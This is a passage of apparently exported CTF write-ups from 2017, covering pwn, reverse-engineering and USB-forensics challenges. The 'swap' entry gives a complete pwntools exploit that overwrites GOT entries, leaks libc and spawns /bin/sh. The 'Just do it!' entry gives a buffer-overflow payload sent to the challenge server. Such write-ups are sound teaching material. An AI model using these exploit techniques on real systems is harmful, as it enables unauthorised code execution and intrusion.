// eax@2 void *src; // [sp+20h] [bp-20h]@0 void *v5; // [sp+28h] [bp-18h]@0 char dest; // [sp+30h] [bp-10h]@7 initialize(); while ( 1 ) &#123; while ( 1 ) &#123; print_menu(); v3 = read_int(); if ( v3 != 1 ) break; puts(\"Please input 1st addr\"); src = (void *)read_ll(); puts(\"Please input 2nd addr\"); v5 = (void *)read_ll(); &#125; if ( v3 == 2 ) &#123; memcpy(&amp;dest, src, 8uLL); memcpy(src, v5, 8uLL); memcpy(v5, &amp;dest, 8uLL); &#125; else if ( !v3 ) &#123; puts(\"Bye.\"); exit(0); &#125; &#125;&#125;__int64 read_int()&#123; __int64 result; // rax@1 char buf; // [sp+10h] [bp-90h]@1 read(0, &amp;buf, 0x10uLL); result = atoi(&amp;buf); return result;&#125;__int64 read_ll()&#123; __int64 result; // rax@1 char buf; // [sp+10h] [bp-110h]@1 read(0, &amp;buf, 0x20uLL); result = atoll(&amp;buf); return result;&#125; Resuming what the program is actually doing: 123Option 1 - Choose two addressesOption 2 - Swap 2 addresses previously chosen (can be used to switch function addresses for example)Option 3 - Prints bye and exits The first thing we can start doing is to get the GOT(Global Offset Table) addresses of the functions we need, we can do this in 3 ways:objdump 1$ objdump -R swap readelf 1$ readelf -r swap pwntools 12345binary = ELF ( './swap' )ATOIGOT = binary.got['atoi']PUTSGOT = binary.got['puts']READGOT = binary.got['read']MEMCOPYGOT = binary.got['memcpy'] To get the PLT addresses we can either use objdump or pwntools againobjdump 1objdump -dj.plt swap pwntools 12binary = ELF ( './swap' )PUTSPLT = binary.plt['puts'] Now making a nice function to swap addresses in python : 12345678910def swap(address1, address2): print r.recvuntil('Your choice: \\n') send('1') print r.recvuntil('Please input 1st addr') send(str(address1)) print r.recvuntil('Please input 2nd addr') send(str(address2)) print r.recvuntil('Your choice: \\n') send('2') We can start by thinking into changing memcpy_got and read_got addresses, and why? because with this when we choose the option 2 to swap we will have something like this: 123read(&amp;dest, address1, 8uLL);read(address1, address2, 8uLL);read(address2, &amp;dest, 8uLL); The second read is what is interesting to us, we can controll the first two arguments to our advantage, if we choose the 1st address to be the file descriptor 0(STDIN) and the 2nd address the function we want to overwrite. 1read(0, ATOI_GOT, 0x8); // example: 1st arg: 0, 2nd arg: ATOI_GOT The next thing to do is to overwrite atoi function and why we want to do it? Because if we overwrite atoi into puts_plt we can leak addresses easily, because we first read them and then print them! 12read(0, &amp;buf, 0x10uLL);result = puts(&amp;buf); Now that we overwrite atoi with puts we can start trying to leak libc addresses like this: 1234print r.recvuntil('choice: \\n')r.send(\"B\")h = u64(r.recv(6).ljust(8, '\\x00')) # ljust will convert an address like 0x7f3253354340 into 0x0007f3253354340print \"STACK ADDRESS 0x%x\"%h Now we got a stack address but it’s still not the address we need, we have to calculate the offset of this address to the libcbase address! we can calculate this with help of gdb. Just run your python script (there will be a sleep of 5 seconds and attach the PID address on gdb like this: 123456789101112131415pwndbg&gt; attach 6865...outputfrompwngdb...pwndbg&gt; continuepwndbg&gt; p system$1 = &#123;&lt;text variable, no debug info&gt;&#125; 0x7fcb77dea391 &lt;system&gt;---------------runing-program-in-another-terminal---------------$ python swap.py..hidden-output...1. Set addrsses2. Swap both addrress of value0. ExitYour choice: STACK ADDRESS 0x7fcb7816a642 Now if we subtract the leaked address from the system address we got from gdb we will get and offset to system function: 12$ python -c \"print hex(0x7fcb7816a642 - 0x7fcb77dea391)\"0x3802b1 Adapting the python script: 123456789h = u64(r.recv(6).ljust(8, '\\x00'))print \"STACK ADDRESS 0x%x\"%haddr = h-0x3802b1- libc.symbols['system']LIBCBASE = addrSYSTEM = LIBCBASE + libc.symbols['system']#print r.recv(1024)log.info(\"LIBC 0x%x\" % LIBCBASE)log.info(\"SYSTEM 0x%x\" % SYSTEM) We still have a small problem from now on, now that we overwrite the atoi we can’t really choose which option from the menu, well we actually can! puts returns the number of bytes printed! the null byte is included in this count! 12int i = puts(&apos;\\x00&apos;) // returns 1int i = puts(&apos;B\\x00&apos;) // returns 2 Now we give the input ‘B\\x00’ into puts so it will return the value 2! and we overwrite the atoi-&gt;puts-&gt;system and sent the “/bin/sh\\x00” string to get ourselves a shell!: 1234567r.send('a\\x00') # returns option 2 from putsprint r.recvuntil('choice: \\n')r.send(p64(SYSTEM)) # overwrites atoi -&gt; puts -&gt; systemprint r.recvuntil('choice: \\n')r.send('/bin/sh\\x00') # passes argument /bin/sh into system The full script is: 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566from pwn import *from pwnlib.tubes import *from pwnlib.util.packing import *from pwnlib.tubes.process import *from pwnlib.tubes.remote import *import structimport timedef getConn(local): return process('./swap', env = &#123;\"LD_PRELOAD\":\"./libc.so.6\"&#125;) if local else remote('pwn1.chal.ctf.westerns.tokyo', 19937)def send(s): print s r.sendline(s)def swap(address1, address2): print r.recvuntil('Your choice: \\n') send('1') print r.recvuntil('Please input 1st addr') send(str(address1)) print r.recvuntil('Please input 2nd addr') send(str(address2)) print r.recvuntil('Your choice: \\n') send('2')local = Falsebinary = ELF ( './swap' )libc = ELF('./libc.so.6')PUTSPLT = binary.plt['puts']ATOIGOT = binary.got['atoi']PUTSGOT = binary.got['puts']READGOT = binary.got['read']MEMCOPYGOT = binary.got['memcpy']r = getConn(local)swap(MEMCOPYGOT,READGOT)swap(0,ATOIGOT)r.send(p64(PUTSPLT))print r.recvuntil('choice: \\n')r.send(\"B\")h = u64(r.recv(6).ljust(8, '\\x00'))print \"STACK ADDRESS 0x%x\"%haddr = h-0x3802b1- libc.symbols['system']LIBCBASE = addrSYSTEM = LIBCBASE + libc.symbols['system']#print r.recv(1024)log.info(\"LIBC 0x%x\" % LIBCBASE)log.info(\"SYSTEM 0x%x\" % SYSTEM)r.send('a\\x00')print r.recvuntil('choice: \\n')r.send(p64(SYSTEM))print r.recvuntil('choice: \\n')r.send('/bin/sh\\x00')r.interactive()r.close() Running it 1234567891011121314151617181920$ python swap.py[*] '~/swap' Arch: amd64-64-little RELRO: Partial RELRO Stack: Canary found NX: NX enabled PIE: No PIE (0x400000)[*] '~/libc.so.6' Arch: amd64-64-little RELRO: Partial RELRO Stack: Canary found NX: NX enabled PIE: PIE enabled...hidden-output...STACK ADDRESS 0x7fe5d8827642[*] LIBC 0x7fe5d8462001[*] SYSTEM 0x7fe5d84a7391...hidden-output...$ cat flagTWCTF&#123;SWAP_SAWP_WASP_PWAS_SWPA&#125; I didn’t solve this challenge in the CTF tournament I actually read this write ups(https://ctftime.org/writeup/7387 and https://github.com/sk4px/CTFs/blob/master/tw2017/swap.py) and did the challenge by myself after that.","categories":[{"name":"Pwn","slug":"Pwn","permalink":"https://teamrocketist.github.io/categories/Pwn/"}],"tags":[{"name":"pwn","slug":"pwn","permalink":"https://teamrocketist.github.io/tags/pwn/"},{"name":"swapaddresses","slug":"swapaddresses","permalink":"https://teamrocketist.github.io/tags/swapaddresses/"}]},{"title":"[Reverse] Tokyo Westerns CTF 3rd 2017 - Rev Rev Rev","slug":"Reverse-Tokyo-Westerns-CTF-3rd-2017-Rev-Rev-Rev","date":"2017-09-04T01:25:49.000Z","updated":"2017-09-04T18:14:47.808Z","comments":true,"path":"2017/09/04/Reverse-Tokyo-Westerns-CTF-3rd-2017-Rev-Rev-Rev/","link":"","permalink":"https://teamrocketist.github.io/2017/09/04/Reverse-Tokyo-Westerns-CTF-3rd-2017-Rev-Rev-Rev/","excerpt":"","text":"Rev Rev RevProblemrev_rev_rev Lets first disassemble the main function of the binary: Ignoring the MK_FP function which is related to the stack canaries protection on the executable we can see the program is reading from the STDIN into s and then modifies 4 modifications on the string using 4 functions: sub_80486B9(&amp;s);sub_80486DB(&amp;s);sub_8048738(&amp;s);sub_80487B2(&amp;s); Sub_80486B9 is just removing the new line in the end of the string by inserting a nullbyte on it (note that 10 or 0x0A in hex represents the \\n): 12345678char *__cdecl sub_80486B9(char *s)&#123; char *result; // eax@1 result = strchr(s, 10); *result = 0; return result;&#125; sub_80486DB is just reversing the string: 1234567891011121314151617181920char *__cdecl sub_80486DB(char *s)&#123; char v1; // ST17_1@2 char *result; // eax@3 char *v3; // [sp+8h] [bp-10h]@1 char *i; // [sp+Ch] [bp-Ch]@1 v3 = s; for ( i = &amp;s[strlen(s) - 1]; ; --i ) &#123; result = v3; if ( v3 &gt;= i ) break; v1 = *v3; *v3 = *i; *i = v1; ++v3; &#125; return result;&#125; sub_8048738 is performing a bunch of operation on the characters of the string some AND, OR and shifts 123456789101112131415161718int __cdecl sub_8048738(char *a1)&#123; char v1; // ST0B_1@2 unsigned __int8 v2; // ST0B_1@2 int result; // eax@3 char *i; // [sp+Ch] [bp-4h]@1 for ( i = a1; ; ++i ) &#123; result = (unsigned __int8)*i; if ( !(_BYTE)result ) break; v1 = 2 * (*i &amp; 0x55) | (*i &gt;&gt; 1) &amp; 0x55; v2 = 4 * (v1 &amp; 0x33) | (v1 &gt;&gt; 2) &amp; 0x33; *i = 16 * v2 | (v2 &gt;&gt; 4); &#125; return result;&#125; sub_80487B2 is flipping the bits of each byte using ~ operator 1234567891011121314int __cdecl sub_80487B2(_BYTE *a1)&#123; int result; // eax@3 _BYTE *i; // [sp+Ch] [bp-4h]@1 for ( i = a1; ; ++i ) &#123; result = *i; if ( !(_BYTE)result ) break; *i = ~*i; &#125; return result;&#125; We could rewrite this functions in python and apply it into the cipher string to get the real flag back! but thats too much work why don’t we insert the ciphertext to the binary and check if it spits the flag? lets do this with radare2: And we got the flag!!! Additionally I did a python script that interacts with radare2 using r2pipe which is a really cool python package, this script will automate what I did manually above doing a dynamic analysis: 12345678910111213141516171819202122232425import r2pipeimport structprofile = \"\"\"#!/usr/bin/rarun2program=./rev_rev_revstdin=output\"\"\"with open('profile.r2','w+') as f: print &gt;&gt;f, profilebuf = struct.pack (\"31B\", *[0x41,0x29,0xd9,0x65,0xa1,0xf1,0xe1,0xc9,0x19,0x09,0x93,0x13,0xa1,0x09,0xb9,0x49,0xb9,0x89,0xdd,0x61,0x31,0x69,0xa1,0xf1,0x71,0x21,0x9d,0xd5,0x3d,0x15,0xd5])with open('output','w+') as f: print &gt;&gt;f, bufr2=r2pipe.open('./rev_rev_rev')r2.cmd(\"e dbg.profile=profile.r2\")r2.cmd(\"doo\")r2.cmd(\"db 0x804866D\")r2.cmd(\"dc\")ciphertext = r2.cmd(\"pcp 31@ 0x8048870\")print r2.cmd(\"psz @ (ebp-0x2d)\") Running it 12$ python revrevrev.py 2&gt;/dev/null TWCTF&#123;qpzisyDnbmboz76oglxpzYdk&#125;","categories":[{"name":"Reverse","slug":"Reverse","permalink":"https://teamrocketist.github.io/categories/Reverse/"}],"tags":[{"name":"xor","slug":"xor","permalink":"https://teamrocketist.github.io/tags/xor/"},{"name":"reverse","slug":"reverse","permalink":"https://teamrocketist.github.io/tags/reverse/"},{"name":"radare2","slug":"radare2","permalink":"https://teamrocketist.github.io/tags/radare2/"},{"name":"ida","slug":"ida","permalink":"https://teamrocketist.github.io/tags/ida/"}]},{"title":"[Pwn] Tokyo Westerns CTF 3rd 2017 - Just do it!","slug":"Pwn-Tokyo-Westerns-CTF-3rd-2017-Just-do-it","date":"2017-09-04T00:29:07.000Z","updated":"2017-09-04T07:50:31.520Z","comments":true,"path":"2017/09/04/Pwn-Tokyo-Westerns-CTF-3rd-2017-Just-do-it/","link":"","permalink":"https://teamrocketist.github.io/2017/09/04/Pwn-Tokyo-Westerns-CTF-3rd-2017-Just-do-it/","excerpt":"","text":"Just do it!ProblemDo it! Do it!nc pwn1.chal.ctf.westerns.tokyo 12345(Alternative port: nc pwn1.chal.ctf.westerns.tokyo 12482)just_do_it Starting by De-assembler with ida and use its ability to some c pseudo code: 123456789101112131415161718192021222324252627282930313233int __cdecl main(int argc, const char **argv, const char **envp)&#123; char s; // [sp+8h] [bp-20h]@7 FILE *stream; // [sp+18h] [bp-10h]@1 char *v6; // [sp+1Ch] [bp-Ch]@1 setvbuf(stdin, 0, 2, 0); setvbuf(stdout, 0, 2, 0); setvbuf(_bss_start, 0, 2, 0); v6 = failed_message; stream = fopen(\"flag.txt\", \"r\"); if ( !stream ) &#123; perror(\"file open error.\\n\"); exit(0); &#125; if ( !fgets(flag, 48, stream) ) &#123; perror(\"file read error.\\n\"); exit(0); &#125; puts(\"Welcome my secret service. Do you know the password?\"); puts(\"Input the password.\"); if ( !fgets(&amp;s, 32, stdin) ) &#123; perror(\"input error.\\n\"); exit(0); &#125; if ( !strcmp(&amp;s, PASSWORD) ) v6 = success_message; puts(v6); return 0;&#125; We can see clearly there is a buffer overflow problem on strcmp PASSWORD comes from STDIN, if we give a password greater than the variable s can handle, we will overflow in this one we don’t even need to modify the ret address. We can just modify the address from v6 to the flag variable address! which is stored from a file “flag.txt” in the server. First lets just discover the offset we could know this by looking at the assembly code and check how space was saved in the stack for this variable by looking the offset from ebp or we can just use gdb with some help from metasploit to generate patterns: 12345678910$ /usr/share/metasploit-framework/tools/exploit/pattern_create.rb -l 50 Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab$ gdb ./justdoitpwndbg&gt; rStarting program: /home/evilgod/Documents/Hacking/ctf/tokyo/pwn/justdoit/just Welcome my secret service. Do you know the password?Input the password.Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5AbProgram received signal SIGSEGV (fault address 0x37614136) We can see it broke at address 0x37614136 we again can calculate it in metasploit with pattern_offset 12$ /usr/share/metasploit-framework/tools/exploit/pattern_offset.rb -q 0x37614136[*] Exact match at offset 20 Now we can see we need to add more than 20 characters to overflow! now lets use IDA to get the address where is stored our flag: And finally writing a script: 123FLAG = 0x0804A080payload = 'A' *20 + struct.pack('&lt;L',FLAG)print payload getting the flag….1234$ python justdoit.py | nc pwn1.chal.ctf.westerns.tokyo 12482Welcome my secret service. Do you know the password?Input the password.TWCTF&#123;pwnable_warmup_I_did_it!&#125;","categories":[{"name":"Pwn","slug":"Pwn","permalink":"https://teamrocketist.github.io/categories/Pwn/"}],"tags":[{"name":"pwn","slug":"pwn","permalink":"https://teamrocketist.github.io/tags/pwn/"},{"name":"bufferOverflow","slug":"bufferOverflow","permalink":"https://teamrocketist.github.io/tags/bufferOverflow/"}]},{"title":"[Forensics] Hackit 2017 - USB ducker","slug":"Forensics-Hackit-2017-USB-ducker","date":"2017-08-29T16:25:11.000Z","updated":"2017-08-29T17:21:15.212Z","comments":true,"path":"2017/08/29/Forensics-Hackit-2017-USB-ducker/","link":"","permalink":"https://teamrocketist.github.io/2017/08/29/Forensics-Hackit-2017-USB-ducker/","excerpt":"","text":"USB duckerforen100Description: This file was captured from one of the computers at the Internet cafe. We think that the hacker was using this computer at that time. Try to get his secret documents. ( flag format is flag{…} )Attachment: (none)Webpage: https://mega.nz/#!NVJ1kZCR!mDxd7V0rHtMStePa-tUEHPW-SyAxQ6f1zRDCTxX8y3MHint: (none) Another USB pcap, after analysing it with wireshark we can see that we have two devices one is a keyboard(bInterfaceClass: HID: 0x3) and the other is a mouse(Unknown)… Mouse Keyboard We can clearly see we that HID: 0x3 is a keyboard by searching for strings in wireshark EDIT -&gt; Find Packet I actually tried to see what the hacker did with the mouse but didn’t found anything special just a straight line of clicks you could parse the mouse inputs with tshark like this for example:1tshark -r task.pcap -Y \"usb.transfer_type == 0x01 &amp;&amp; usb.bInterfaceClass!=3\" -Tfields -e usb.capdata &gt; mouse Moving on to the keyboard since the mouse didn’t got us anything special we just got the output from the keyboard1tshark -r task.pcap -Y \"usb.transfer_type == 0x01 &amp;&amp; usb.bInterfaceClass==3\" -Tfields -e usb.capdata &gt; keyboard Now the tricky part here is, the hacker used the arrow keys! making it harder to make a script to spit out the keyboard inputs, well during the CTF I got frustrated, and choose to make it by hand by looking at the table on http://www.usb.org/developers/hidpage/Hut1_12v2.pdf (table 12). The keyboard inputs can be read like this: 12345 |-&gt; The value of the keypressed you can &quot;decode&quot; this value from the table 12 above |02:00:20:00:00:00:00:00| |--&gt; This value is 02 when shift is pressed and 00 when it isn&apos;t When the CTF finished I ended up doing a script to do this (it’s not perfect there is alot of more things to consider). 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293#!/usr/bin/python # -*- coding: utf-8 -*-KEY_CODES = &#123; 0x04:['a', 'A'], 0x05:['b', 'B'], 0x06:['c', 'C'], 0x07:['d', 'D'], 0x08:['e', 'E'], 0x09:['f', 'F'], 0x0A:['g', 'G'], 0x0B:['h', 'H'], 0x0C:['i', 'I'], 0x0D:['j', 'J'], 0x0E:['k', 'K'], 0x0F:['l', 'L'], 0x10:['m', 'M'], 0x11:['n', 'N'], 0x12:['o', 'O'], 0x13:['p', 'P'], 0x14:['q', 'Q'], 0x15:['r', 'R'], 0x16:['s', 'S'], 0x17:['t', 'T'], 0x18:['u', 'U'], 0x19:['v', 'V'], 0x1A:['w', 'W'], 0x1B:['x', 'X'], 0x1C:['y', 'Y'], 0x1D:['z', 'Z'], 0x1E:['1', '!'], 0x1F:['2', '@'], 0x20:['3', '#'], 0x21:['4', '$'], 0x22:['5', '%'], 0x23:['6', '^'], 0x24:['7', '&amp;'], 0x25:['8', '*'], 0x26:['9', '('], 0x27:['0', ')'], 0x28:['\\n','\\n'], 0x2C:[' ', ' '], 0x2D:['-', '_'], 0x2E:['=', '+'], 0x2F:['[', '&#123;'], 0x30:[']', '&#125;'], 0x32:['#','~'], 0x33:[';', ':'], 0x34:['\\'', '\"'], 0x36:[',', '&lt;'], 0x38:['/', '?'], 0x37:['.', '&gt;'], 0x2b:['\\t','\\t'], 0x4f:[u'→',u'→'], 0x50:[u'←',u'←'], 0x51:[u'↓',u'↓'], 0x52:[u'↑',u'↑']&#125; #tshark -r ./usb.pcap -Y 'usb.capdata' -T fields -e usb.capdata &gt; keyboards.txtdatas = open('keyboard').read().split('\\n')[:-1]cursor_x = 0cursor_y = 0offset_current_line = 0lines = ['','','','','']output = ''for data in datas: shift = int(data.split(':')[0], 16) / 2 key = int(data.split(':')[2], 16) if key == 0: continue if KEY_CODES[key][shift] == u'↑': lines[cursor_y] += output output = '' cursor_y -= 1 elif KEY_CODES[key][shift] == u'↓': lines[cursor_y] += output output = '' cursor_y += 1 elif KEY_CODES[key][shift] == u'→': cursor_x += 1 elif KEY_CODES[key][shift] == u'←': cursor_x -= 1 elif KEY_CODES[key][shift] == '\\n': lines[cursor_y] += output cursor_x = 0 cursor_y += 1 output = '' else: output += KEY_CODES[key][shift] cursor_x += 1print '\\n'.join(lines) Now running the script 123456teamrocketist@Debian ~/D/H/c/h/f/for100&gt; python key2.pyw&#123;w$ju&#125;,'pt]=j%;9+ps&amp;#,k#&gt;bn$:6pjim0&#123;u'h;fks!s-flag&#123;k3yb0ard_sn4ke_2.0&#125;b[[e[fu~7d[=&gt;*(0]'$1c$ce3'ci.[%=%&amp;k(lc*2y4!&#125;%qz3 The flag is flag{k3yb0ard_sn4ke_2.0}","categories":[{"name":"Forensics","slug":"Forensics","permalink":"https://teamrocketist.github.io/categories/Forensics/"}],"tags":[{"name":"forensics","slug":"forensics","permalink":"https://teamrocketist.github.io/tags/forensics/"},{"name":"pcap","slug":"pcap","permalink":"https://teamrocketist.github.io/tags/pcap/"},{"name":"keyboard","slug":"keyboard","permalink":"https://teamrocketist.github.io/tags/keyboard/"},{"name":"mouse","slug":"mouse","permalink":"https://teamrocketist.github.io/tags/mouse/"},{"name":"wireshark","slug":"wireshark","permalink":"https://teamrocketist.github.io/tags/wireshark/"},{"name":"tshark","slug":"tshark","permalink":"https://teamrocketist.github.io/tags/tshark/"},{"name":"usb","slug":"usb","permalink":"https://teamrocketist.github.io/tags/usb/"}]},{"title":"[Reverse] Hackit 2017 - rev200","slug":"Reverse-Hackit-2017-rev200","date":"2017-08-27T22:21:35.000Z","updated":"2017-08-27T23:26:57.663Z","comments":true,"path":"2017/08/27/Reverse-Hackit-2017-rev200/","link":"","permalink":"https://teamrocketist.github.io/2017/08/27/Reverse-Hackit-2017-rev200/","excerpt":"","text":"rev200Description: You haxor, come on you little sciddie… debug me, eh? You fucking little lamer… You fuckin’ come on, come debug me! I’ll get your ass, you jerk! Oh, you IDA monkey! Fuck all you and your tools! Come on, you scum haxor, you try to reverse me? Come on, you asshole!!Attachment: (none)Webpage: https://mega.nz/#!RQJk0ZbR!7myppeUU6fwqRY2cOaX8EPTpC9pVIHEsWdUNw0szexcHint: (none) When I looked up into this challenge I just checked the assembly code and found it way too easy for 200 points, but then I saw something weird I couldn’t start it for debugging and then I checked the file types: 12$ file rev200\\ \\(1\\).efi rev200 (1).efi: PE32+ executable (DLL) (EFI application) x86-64 (stripped to external PDB), for MS Windows Oh its a ddl, that’s why well I still found it way to easy for all this points specially because with IDA we can convert this beautiful assembly code(missing the code for algo function): Into this beautiful “pseudo c” code(press F5 in IDA), well it makes everything much easier even thought the assembly wasn’t that hard to reverse…. Here we have the pseudo c code for “main” function and “algo” function… 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667__int64 __fastcall efi_main(__int64 a1, __int64 a2)&#123; UINTN v2; // rbx@3 char v4[48]; // [sp+20h] [bp-A0h]@1 __int16 v5; // [sp+48h] [bp-78h]@1 CHAR16 String[48]; // [sp+50h] [bp-70h]@1 int v7; // [sp+A0h] [bp-20h]@1 char v8; // [sp+B0h] [bp-10h]@4 int v9; // [sp+B8h] [bp-8h]@1 int i; // [sp+BCh] [bp-4h]@1 __int64 v11; // [sp+E8h] [bp+28h]@1 v11 = a2; InitializeLib(); memset(String, 0, 0x50ui64); v7 = 0; memset(v4, 0, 0x28ui64); v5 = 0; v9 = 0; Input(L\"Enter the flag: \", String, 42i64); for ( i = 0; ; ++i ) &#123; v2 = i; if ( v2 &gt;= StrLen(String) ) break; v4[i] = String[i]; &#125; algo((__int64)v4); (**(void (__fastcall ***)(_QWORD, _QWORD))(v11 + 48))(*(_QWORD *)(v11 + 48), 0i64); (*(void (__fastcall **)(signed __int64, signed __int64, char *))(*(_QWORD *)(v11 + 96) + 96i64))( 1i64, *(_QWORD *)(v11 + 48) + 16i64, &amp;v8); return 0i64;&#125;UINTN __fastcall algo(__int64 a1)&#123; UINTN result; // rax@17 int v2[40]; // [sp+20h] [bp-60h]@11 int v3[20]; // [sp+C0h] [bp+40h]@5 int v4[23]; // [sp+110h] [bp+90h]@2 int m; // [sp+16Ch] [bp+ECh]@13 int l; // [sp+170h] [bp+F0h]@10 int k; // [sp+174h] [bp+F4h]@7 int j; // [sp+178h] [bp+F8h]@4 int i; // [sp+17Ch] [bp+FCh]@1 for ( i = 0; i &lt;= 19; ++i ) v4[i] = *(_BYTE *)(i + a1); for ( j = 20; j &lt;= 39; ++j ) v3[j - 20] = *(_BYTE *)(j + a1); for ( k = 0; k &lt;= 19; ++k ) &#123; v4[k] = (((((v4[k] ^ 0xC) + 6) ^ 0xD) + 7) ^ 0xE) + 8; v3[k] = (((((v3[k] ^ 0xF) + 9) ^ 0x10) + 10) ^ 0x11) + 11; &#125; for ( l = 0; l &lt;= 19; ++l ) v2[l] = v4[l]; for ( m = 20; m &lt;= 39; ++m ) v2[m] = v3[m - 20]; if ( (unsigned int)memcmp((__int64)v2, (__int64)&amp;correct, 160) ) result = Print(L\"\\nWrong\\n\"); else result = Print(L\"\\nCorrect\\n\"); return result;&#125; By reading this c code above we can clearly understand what is going on. the program itself reads from the stdout the flag and then encrypts a bunch of bytes with some xor operations and other stupid simple manipulations, since we know the ciphertext (we can get it from IDA) just double click on “correct” symbol from the main function and you will see its value in the global variables: 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143144145146147148149150151152153154155156157158159160161.data:0000000070946000 public correct.data:0000000070946000 correct db 68h ; h ; DATA XREF: algo+18E\u0018o.data:0000000070946001 db 0.data:0000000070946002 db 0.data:0000000070946003 db 0.data:0000000070946004 db 3Ch ; &lt;.data:0000000070946005 db 0.data:0000000070946006 db 0.data:0000000070946007 db 0.data:0000000070946008 db 79h ; y.data:0000000070946009 db 0.data:000000007094600A db 0.data:000000007094600B db 0.data:000000007094600C db 71h ; q.data:000000007094600D db 0.data:000000007094600E db 0.data:000000007094600F db 0.data:0000000070946010 db 63h ; c.data:0000000070946011 db 0.data:0000000070946012 db 0.data:0000000070946013 db 0.data:0000000070946014 db 7Ch ; |.data:0000000070946015 db 0.data:0000000070946016 db 0.data:0000000070946017 db 0.data:0000000070946018 db 81h ; ü.data:0000000070946019 db 0.data:000000007094601A db 0.data:000000007094601B db 0.data:000000007094601C db 92h ; Æ.data:000000007094601D db 0.data:000000007094601E db 0.data:000000007094601F db 0.data:0000000070946020 db 92h ; Æ.data:0000000070946021 db 0.data:0000000070946022 db 0.data:0000000070946023 db 0.data:0000000070946024 db 65h ; e.data:0000000070946025 db 0.data:0000000070946026 db 0.data:0000000070946027 db 0.data:0000000070946028 db 65h ; e.data:0000000070946029 db 0.data:000000007094602A db 0.data:000000007094602B db 0.data:000000007094602C db 93h ; ô.data:000000007094602D db 0.data:000000007094602E db 0.data:000000007094602F db 0.data:0000000070946030 db 92h ; Æ.data:0000000070946031 db 0.data:0000000070946032 db 0.data:0000000070946033 db 0.data:0000000070946034 db 49h ; I.data:0000000070946035 db 0.data:0000000070946036 db 0.data:0000000070946037 db 0.data:0000000070946038 db 79h ; y.data:0000000070946039 db 0.data:000000007094603A db 0.data:000000007094603B db 0.data:000000007094603C db 92h ; Æ.data:000000007094603D db 0.data:000000007094603E db 0.data:000000007094603F db 0.data:0000000070946040 db 38h ; 8.data:0000000070946041 db 0.data:0000000070946042 db 0.data:0000000070946043 db 0.data:0000000070946044 db 6Ch ; l.data:0000000070946045 db 0.data:0000000070946046 db 0.data:0000000070946047 db 0.data:0000000070946048 db 3Ch ; &lt;.data:0000000070946049 db 0.data:000000007094604A db 0.data:000000007094604B db 0.data:000000007094604C db 6Fh ; o.data:000000007094604D db 0.data:000000007094604E db 0.data:000000007094604F db 0.data:0000000070946050 db 7Bh ; &#123;.data:0000000070946051 db 0.data:0000000070946052 db 0.data:0000000070946053 db 0.data:0000000070946054 db 87h ; ç.data:0000000070946055 db 0.data:0000000070946056 db 0.data:0000000070946057 db 0.data:0000000070946058 db 58h ; X.data:0000000070946059 db 0.data:000000007094605A db 0.data:000000007094605B db 0.data:000000007094605C db 55h ; U.data:000000007094605D db 0.data:000000007094605E db 0.data:000000007094605F db 0.data:0000000070946060 db 89h ; ë.data:0000000070946061 db 0.data:0000000070946062 db 0.data:0000000070946063 db 0.data:0000000070946064 db 5Ah ; Z.data:0000000070946065 db 0.data:0000000070946066 db 0.data:0000000070946067 db 0.data:0000000070946068 db 59h ; Y.data:0000000070946069 db 0.data:000000007094606A db 0.data:000000007094606B db 0.data:000000007094606C db 7Eh ; ~.data:000000007094606D db 0.data:000000007094606E db 0.data:000000007094606F db 0.data:0000000070946070 db 7Eh ; ~.data:0000000070946071 db 0.data:0000000070946072 db 0.data:0000000070946073 db 0.data:0000000070946074 db 6Bh ; k.data:0000000070946075 db 0.data:0000000070946076 db 0.data:0000000070946077 db 0.data:0000000070946078 db 87h ; ç.data:0000000070946079 db 0.data:000000007094607A db 0.data:000000007094607B db 0.data:000000007094607C db 6Ch ; l.data:000000007094607D db 0.data:000000007094607E db 0.data:000000007094607F db 0.data:0000000070946080 db 57h ; W.data:0000000070946081 db 0.data:0000000070946082 db 0.data:0000000070946083 db 0.data:0000000070946084 db 6Ch ; l.data:0000000070946085 db 0.data:0000000070946086 db 0.data:0000000070946087 db 0.data:0000000070946088 db 6Bh ; k.data:0000000070946089 db 0.data:000000007094608A db 0.data:000000007094608B db 0.data:000000007094608C db 58h ; X.data:000000007094608D db 0.data:000000007094608E db 0.data:000000007094608F db 0.data:0000000070946090 db 59h ; Y.data:0000000070946091 db 0.data:0000000070946092 db 0.data:0000000070946093 db 0.data:0000000070946094 db 5Ah ; Z.data:0000000070946095 db 0.data:0000000070946096 db 0.data:0000000070946097 db 0.data:0000000070946098 db 5Ah ; Z.data:0000000070946099 db 0.data:000000007094609A db 0.data:000000007094609B db 0.data:000000007094609C db 6Fh ; o.data:000000007094609D db 0.data:000000007094609E db 0.data:000000007094609F db 0 Now parsing it with sublime-txt(very fast and easy to do it), than we put into a hex byte characters string in python… why not put the characters since ida actually shows some of them? Because this is a ciphertext and some characters may be unprintable or those which can be printed may require unicode and we all know how boring is to deal with unicode in python … so I always use hex bytes. 1correct = \"\\x68\\x3C\\x79\\x71\\x63\\x7C\\x81\\x92\\x92\\x65\\x65\\x93\\x92\\x49\\x79\\x92\\x38\\x6C\\x3C\\x6F\\x7B\\x87\\x58\\x55\\x89\\x5A\\x59\\x7E\\x7E\\x6B\\x87\\x6C\\x57\\x6C\\x6B\\x58\\x59\\x5A\\x5A\\x6F\" Now I have an idea instead of trying to make a function that reverses those two functions why not bruteforce byte by byte, replicate the pseudo c code in python and when we get the final ciphertext equal to the “correct” variable we end the calculations and print the original string? seems like a cool plan! so we just rewrite that c code into python and then we add some loops to bruteforce the rest of the flag!!! We don’t even need to bruteforce from the range from 0x00 to the 0xff we can just use printable characters since the flag will only have those! and more we already have the beginning and the end of the flag which is “h4ck1t{“ and “}”. Here is the final payload:123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778from __future__ import print_functionimport difflibimport sysimport stringfrom difflib import Differcorrect = 